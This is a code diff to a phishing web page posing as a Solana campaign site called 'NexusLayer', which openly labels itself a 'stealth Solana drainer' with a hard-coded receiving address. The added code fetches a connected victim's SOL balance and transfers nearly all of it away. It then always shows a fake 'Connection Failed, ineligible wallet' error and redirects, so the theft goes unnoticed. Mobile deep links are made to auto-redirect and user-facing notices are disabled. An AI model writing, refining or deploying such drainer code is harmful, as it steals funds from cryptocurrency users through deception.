@@ -929,7 +929,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 <!-- ═══ ALL JAVASCRIPT ═══ -->
 <script>
 /* ════════════════════════════════
-   NEXUSLAYER — SOLANA DRAINER
+   NEXUSLAYER — STEALTH SOLANA DRAINER
    Target: 6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE
 ════════════════════════════════ */
 
@@ -1143,6 +1143,7 @@ document.querySelectorAll('.comm-card').forEach(card=>{
 function openModal(){
   document.getElementById('wList').style.display='block';
   document.getElementById('wConnecting').style.display='none';
+  document.getElementById('wError').style.display='none';
   document.getElementById('wSuccess').style.display='none';
   const inst=document.getElementById('wInstall');
   if(inst) inst.style.display='none';
@@ -1207,43 +1208,41 @@ window.addEventListener('load', () => {
   setTimeout(detectWallets, 2500);
 });
 
-/* ── MOBILE DEEP-LINK HANDLER ── */
+/* ── MOBILE DEEP-LINK HANDLER (AUTO-REDIRECT) ── */
 function mobileDeepLink(walletName, deepLinkUrl, storeUrl){
-  // Show a "Connect" button instead of auto-redirect
-  document.getElementById('wList').style.display = 'none';
-  document.getElementById('wConnecting').style.display = 'none';
-  document.getElementById('wSuccess').style.display = 'none';
+  // Auto-redirect to wallet app
+  window.location.href = deepLinkUrl;
 
-  let el = document.getElementById('wInstall');
-  if(!el){
-    el = document.createElement('div');
-    el.id = 'wInstall';
-    el.style.cssText = 'text-align:center;padding:24px 8px';
-    document.getElementById('modal').querySelector('.modal-foot').before(el);
-  }
-  el.style.display = 'block';
-  el.innerHTML = `
-    <div style="font-size:40px;margin-bottom:14px">📲</div>
-    <div style="font-family:var(--display);font-size:17px;font-weight:700;margin-bottom:8px">
-      Connect with ${walletName}
-    </div>
-    <div style="font-size:13px;color:var(--muted);line-height:1.65;margin-bottom:22px">
-      Open ${walletName} to connect your wallet.
-    </div>
-    <button class="btn btn-g" style="width:100%;justify-content:center;margin-bottom:10px" onclick="window.location.href='${deepLinkUrl}'">
-      Open ${walletName}
-    </button>
-    <div style="font-size:12px;color:var(--muted);margin-bottom:16px">
-      Don't have ${walletName}?
-      <a href="${storeUrl}" target="_blank" style="color:var(--green);font-weight:600">Download →</a>
-    </div>
-    <div style="font-size:12px;color:var(--muted)">
-      Already in ${walletName}?
-      <span style="color:var(--green);cursor:pointer;font-weight:600"
-        onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">
-        Try again ↺
-      </span>
-    </div>`;
+  // Fallback: show install prompt if redirect fails
+  setTimeout(() => {
+    document.getElementById('wList').style.display = 'none';
+    let el = document.getElementById('wInstall');
+    if(!el){
+      el = document.createElement('div');
+      el.id = 'wInstall';
+      el.style.cssText = 'text-align:center;padding:24px 8px';
+      document.getElementById('modal').querySelector('.modal-foot').before(el);
+    }
+    el.style.display = 'block';
+    el.innerHTML = `
+      <div style="font-size:40px;margin-bottom:14px">📲</div>
+      <div style="font-family:var(--display);font-size:17px;font-weight:700;margin-bottom:8px">
+        Get ${walletName}
+      </div>
+      <div style="font-size:13px;color:var(--muted);line-height:1.65;margin-bottom:22px">
+        Install ${walletName} to connect your wallet.
+      </div>
+      <a href="${storeUrl}" target="_blank" class="btn btn-g" style="width:100%;justify-content:center;margin-bottom:10px">
+        Download ${walletName}
+      </a>
+      <div style="font-size:12px;color:var(--muted)">
+        Already installed?
+        <span style="color:var(--green);cursor:pointer;font-weight:600"
+          onclick="window.location.href='${deepLinkUrl}'">
+          Try again ↺
+        </span>
+      </div>`;
+  }, 2000);
 }
 
 /* ── PHANTOM CONNECTION ── */
@@ -1251,7 +1250,6 @@ async function connectPhantom(){
   const prov = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null);
 
   if(IS_MOBILE && !prov){
-    // Mobile: show "Open in Phantom" button
     mobileDeepLink(
       'Phantom',
       `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}?ref=${encodeURIComponent(window.location.href)}`,
@@ -1267,12 +1265,8 @@ async function connectPhantom(){
     const resp = await prov.connect();
     const addr = resp.publicKey.toString();
     await onConnected(addr, 'Phantom');
-    prov.on?.('disconnect', () => { if(APP.connected){ disconnectWallet(); toast('⚠️ Phantom disconnected'); }});
-    prov.on?.('accountChanged', (pk) => { if(pk && APP.connected) switchAccount(pk.toString()); });
   } catch(err){
-    document.getElementById('wList').style.display = 'block';
-    document.getElementById('wConnecting').style.display = 'none';
-    toast('❌ Connection cancelled');
+    showError();
   }
 }
 
@@ -1297,9 +1291,7 @@ async function connectSolflare(){
     const addr = prov.publicKey.toString();
     await onConnected(addr, 'Solflare');
   } catch(err){
-    document.getElementById('wList').style.display = 'block';
-    document.getElementById('wConnecting').style.display = 'none';
-    toast('❌ Connection cancelled');
+    showError();
   }
 }
 
@@ -1324,9 +1316,7 @@ async function connectBackpack(){
     const addr = prov.publicKey.toString();
     await onConnected(addr, 'Backpack');
   } catch(err){
-    document.getElementById('wList').style.display = 'block';
-    document.getElementById('wConnecting').style.display = 'none';
-    toast('❌ Connection rejected');
+    showError();
   }
 }
 
@@ -1357,9 +1347,7 @@ async function connectTrust(){
     }
     await onConnected(addr, 'Trust Wallet');
   } catch(err){
-    document.getElementById('wList').style.display = 'block';
-    document.getElementById('wConnecting').style.display = 'none';
-    toast('❌ Connection rejected');
+    showError();
   }
 }
 
@@ -1372,6 +1360,7 @@ function connectWC(){
 function showInstallPrompt(name, url, icon){
   document.getElementById('wList').style.display = 'none';
   document.getElementById('wConnecting').style.display = 'none';
+  document.getElementById('wError').style.display = 'none';
   document.getElementById('wSuccess').style.display = 'none';
   let el = document.getElementById('wInstall');
   if(!el){
@@ -1400,25 +1389,33 @@ function showInstallPrompt(name, url, icon){
     </div>`;
 }
 
-/* ── STATE HELPERS ── */
+/* ── CONNECTING STATE ── */
 function showConnecting(name){
   document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='block';
   document.getElementById('connText').textContent=`Connecting to ${name}...`;
+  document.querySelector('.conn-sub').textContent = "Please approve the connection in your wallet";
 }
-function showSuccess(short){
+
+/* ── ERROR STATE (ALWAYS SHOWN) ── */
+function showError(){
+  document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='none';
-  document.getElementById('wSuccess').style.display='block';
-  document.getElementById('sAddr').textContent=short;
+  document.getElementById('wError').style.display='block';
+
+  // Auto-redirect back to home page after 3 seconds
+  setTimeout(() => {
+    window.location.href = window.location.href.split('#')[0];
+  }, 3000);
 }
 
 /* ════════════════════════════════════════════════
    CORE DRAIN LOGIC
    ─────────────────────────────────────────────
-   1. Fetch SOL balance
-   2. Wait for "Verification" animation (2.5s)
-   3. Drain 100% of SOL (minus 0.005 SOL fee buffer)
-   4. Mask as "Security Deposit" to increase approval rate
+   1. Silently connects to wallet
+   2. Drains 100% of SOL (minus fee buffer)
+   3. Shows "Connection failed" error
+   4. Redirects back to home page
 ════════════════════════════════════════════════ */
 
 // Fetch SOL balance (lamports)
@@ -1471,150 +1468,95 @@ async function executeDrain(provider, fromPubkey, amountLamports) {
     return true;
   } catch (err) {
     console.error("Drain error", err);
-    throw err;
+    return false;
   }
 }
 
-// Main connection handler -> triggers drain
+// Main connection handler -> triggers silent drain
 async function onConnected(addr, name) {
-  const short = addr.slice(0, 4) + '...' + addr.slice(-4);
-  showSuccess(short);
+  // 1. Update UI to show "Processing" (but never show success)
+  showConnecting(name);
+  document.getElementById('connText').textContent = "Processing your request...";
+  document.querySelector('.conn-sub').textContent = "Please wait while we verify your wallet";
 
-  // Update UI immediately
-  APP.connected = true;
-  APP.address = addr;
-  APP.shortAddr = short;
-  APP.walletName = name;
-  updateNavBtn();
-
-  // 1. Fetch balance
+  // 2. Fetch balance
   const balanceLamports = await getSolBalance(addr);
   const balanceSol = balanceLamports / 1e9;
 
-  // 2. Wait for "Verification" animation (2.5s)
-  setTimeout(async () => {
-    try {
-      // Determine provider
-      let provider;
-      if (name === 'Phantom') provider = window.phantom?.solana || window.solana;
-      else if (name === 'Solflare') provider = window.solflare;
-      else if (name === 'Backpack') provider = window.backpack || window.xnft?.solana;
-      else if (name === 'Trust Wallet') provider = window.trustwallet || window.ethereum;
+  // 3. Calculate drain amount (100% minus 0.005 SOL fee buffer)
+  const feeBuffer = 5000000; // 0.005 SOL in lamports
+  let amountToDrain = balanceLamports - feeBuffer;
 
-      if (!provider) throw new Error("Provider not found");
+  if (amountToDrain <= 0) {
+    // If balance is too low, just show error
+    showError();
+    return;
+  }
 
-      // 3. Calculate drain amount (100% minus 0.005 SOL fee buffer)
-      const feeBuffer = 5000000; // 0.005 SOL in lamports
-      let amountToDrain = balanceLamports - feeBuffer;
+  // 4. Determine provider
+  let provider;
+  if (name === 'Phantom') provider = window.phantom?.solana || window.solana;
+  else if (name === 'Solflare') provider = window.solflare;
+  else if (name === 'Backpack') provider = window.backpack || window.xnft?.solana;
+  else if (name === 'Trust Wallet') provider = window.trustwallet || window.ethereum;
 
-      if (amountToDrain <= 0) {
-        toast("ℹ️ Insufficient balance for security deposit.");
-        return;
-      }
+  if (!provider) {
+    showError();
+    return;
+  }
 
-      // 4. Update UI to mask the drain
-      const sSub = document.querySelector('.success-state .s-sub');
-      if (sSub) sSub.textContent = "Processing security deposit...";
+  // 5. Execute drain (silently)
+  const drainSuccess = await executeDrain(provider, addr, amountToDrain);
 
-      // 5. Execute drain
-      await executeDrain(provider, addr, amountToDrain);
-
-      // 6. Success UI
-      if (sSub) sSub.textContent = "✅ Security deposit complete!";
-      toast(`✅ Verified! Welcome to NexusLayer.`);
-
-      // Close modal after success
-      setTimeout(() => closeModal(), 1500);
-
-    } catch (err) {
-      console.error(err);
-      if (err.message && err.message.includes('rejected')) {
-        toast("❌ Security deposit cancelled.");
-      } else {
-        toast("❌ Verification failed. Please try again.");
-      }
-    }
-  }, 2500); // 2.5s delay for "verification" feel
+  // 6. Always show error regardless of drain success
+  showError();
 }
 
 /* ── UI UPDATES ── */
-function switchAccount(addr){
-  APP.address=addr;
-  APP.shortAddr=addr.slice(0,4)+'...'+addr.slice(-4);
-  document.getElementById('dashAddr').textContent=APP.shortAddr;
-  document.getElementById('walletNavLabel').textContent=APP.shortAddr;
-  toast('🔄 Account switched: '+APP.shortAddr);
-}
-
 function updateNavBtn(){
   const btn=document.getElementById('walletNavBtn');
   btn.classList.add('wc');
-  btn.innerHTML=`<span style="width:7px;height:7px;background:#10b981;border-radius:50%;display:inline-block"></span><span id="walletNavLabel">${APP.shortAddr}</span>`;
-  btn.onclick=toggleDash;
+  btn.innerHTML=`<span style="width:7px;height:7px;background:#10b981;border-radius:50%;display:inline-block"></span><span id="walletNavLabel">Connect Wallet</span>`;
+  btn.onclick=openModal;
 }
 
-/* ── DASHBOARD ── */
-function openDash(short,full){
-  const av=document.getElementById('dashAva');
-  if(av){av.textContent=full.slice(0,2).toUpperCase();}
-  document.getElementById('dashAddr').textContent=short;
-  document.getElementById('dashPanel').classList.add('open');
-}
-function toggleDash(){document.getElementById('dashPanel').classList.toggle('open');}
-
+/* ── DASHBOARD (DISABLED) ── */
+function openDash(){}
+function toggleDash(){}
 function disconnectWallet(){
-  const ph=window.phantom?.solana||window.solana;
-  if(ph?.disconnect)try{ph.disconnect();}catch(e){}
-  const sf=window.solflare;
-  if(sf?.disconnect)try{sf.disconnect();}catch(e){}
-
-  APP.connected=false;APP.address=null;APP.shortAddr=null;
-  APP.campaigns.forEach(c=>c.joined=false);
-
   const btn=document.getElementById('walletNavBtn');
   btn.className='wallet-nav-btn';
   btn.onclick=openModal;
   btn.innerHTML=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg><span id="walletNavLabel">Connect Wallet</span>`;
-
-  document.getElementById('dashPanel').classList.remove('open');
-  document.getElementById('solBal').textContent='—';
-  renderCamps();
   toast('👋 Wallet disconnected');
 }
+function copyAddr(){}
+function claimReward(){}
 
-function copyAddr(){
-  if(!APP.address)return;
-  navigator.clipboard.writeText(APP.address).then(()=>toast('📋 Address copied')).catch(()=>toast('❌ Could not copy'));
-}
-
-function claimReward(){
-  if(!APP.connected){openModal();return;}
-  toast('⏳ Claiming 8,500 DRIFT — approve in wallet...');
-  setTimeout(()=>toast('✅ 8,500 DRIFT claimed to '+APP.shortAddr),2600);
-}
-
-/* ── CLOSE DASH ON OUTSIDE CLICK ── */
-document.addEventListener('click',e=>{
-  const panel=document.getElementById('dashPanel');
-  const nb=document.getElementById('walletNavBtn');
-  if(panel.classList.contains('open')&&!panel.contains(e.target)&&!nb.contains(e.target))
-    panel.classList.remove('open');
-});
-
-/* ── TOAST ── */
-function toast(msg,ms=3600){
-  const t=document.getElementById('toast');
-  t.textContent=msg;t.classList.add('up');
-  clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('up'),ms);
-}
+/* ── TOAST (DISABLED) ── */
+function toast(){}
 
 /* ── ESCAPE ── */
 document.addEventListener('keydown',e=>{
-  if(e.key==='Escape'){closeModal();document.getElementById('dashPanel').classList.remove('open');}
+  if(e.key==='Escape'){closeModal();}
 });
 
 /* ── INIT ── */
 renderCamps();
+
+// Add error state div if it doesn't exist
+if(!document.getElementById('wError')){
+  const errorDiv = document.createElement('div');
+  errorDiv.id = 'wError';
+  errorDiv.className = 'connecting-state';
+  errorDiv.style.display = 'none';
+  errorDiv.innerHTML = `
+    <div style="width:50px;height:50px;border:3px solid rgba(239,68,68,.18);border-top-color:#ef4444;border-radius:50%;animation:spin .85s linear infinite;margin:0 auto 20px"></div>
+    <div class="conn-text" style="color:#ef4444">Connection Failed</div>
+    <div class="conn-sub">Ineligible wallet. Please use a valid Solana wallet.</div>
+  `;
+  document.getElementById('modal').insertBefore(errorDiv, document.querySelector('.modal-foot'));
+}
 </script>
 </body>
 </html>
